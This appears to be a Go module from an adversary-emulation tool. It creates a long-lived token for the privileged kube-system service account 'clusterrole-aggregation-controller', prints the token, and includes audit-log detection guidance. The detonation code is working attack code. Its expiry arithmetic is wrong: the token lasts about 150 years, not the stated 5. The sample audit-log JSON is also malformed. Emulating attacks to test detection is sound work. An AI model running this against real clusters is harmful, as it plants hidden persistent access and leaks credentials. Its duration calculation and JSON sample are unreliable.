package kubernetes

import (
	"context"
	_ "embed"
	"errors"
	"github.com/aws/smithy-go/ptr"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	authenticationv1 "k8s.io/api/authentication/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"log"
	"time"
)

func init() {
	const codeBlock = "```"

	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.persistence.create-token",
		FriendlyName:       "Create Long-Lived Token",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Persistence},
		Description: `
Creates a token with a large expiration for a service account. An attacker can create such a long-lived token to easily gain 
persistence on a compromised cluster.
`,
		Detection: `
Using Kubernetes API server audit logs. In particular, look for create service account tokens requests to privileged
service accounts, or service accounts inside the kube-system namespace.

` + codeBlock + `json
{
  "objectRef": {
    "resource": "serviceaccounts",
    "subresource": "token",
    "name": "clusterrole-aggregation-controller",
    "apiVersion": "v1"
  },
  "http": {
    "url_details": {
      "path": "/api/v1/namespaces/kube-system/serviceaccounts/clusterrole-aggregation-controller/token"
    },
    "method": "create",
    "status_code": 201
  },
  "stage": "ResponseComplete",
  "kind": "Event",
  "level": "Metadata",
  "requestURI": "/api/v1/namespaces/kube-system/serviceaccounts/clusterrole-aggregation-controller/token",
}
` + codeBlock + `

To reduce false positives, it may be useful to filter out the following attributes:

* User name is <code>system:kube-controller-manager</code>
* User group contains <code>system:nodes</code>

Notes:

* The API server audit log does not contain the requested token lifetime, unless the audit logs level is <code>Request</code> or <code>RequestResponse</code> (which is generally not the case)

* AWS EKS caps the token lifetime to 1 hour, although the behavior is undocumented and not part of Kubernetes itself.
`,
		Detonate: detonate,
	})
}

// Name and namespace of the service account to create a long-lived token for
const serviceAccountName = "clusterrole-aggregation-controller" // should always exist by default
const namespace = "kube-system"

// Expiration duration to request
const numYears = 5
const expirationTime = time.Hour * 24 * 30 * 365 * numYears

var params = authenticationv1.TokenRequest{
	Spec: authenticationv1.TokenRequestSpec{
		ExpirationSeconds: ptr.Int64(int64(expirationTime.Seconds())),
	},
}

func detonate(map[string]string) error {
	client := providers.K8s().GetClient()
	ctx := context.Background()

	log.Println("Creating a long-lived token for the service account " + serviceAccountName + " in " + namespace)
	result, err := client.CoreV1().ServiceAccounts(namespace).CreateToken(ctx, serviceAccountName, &params, metav1.CreateOptions{})
	if err != nil {
		return errors.New("unable to create token: " + err.Error())
	}

	token := result.Status.Token
	log.Printf("Successfully created a long-lived token valid for the next %d years: \n%s\n", numYears, token)
	return nil
}
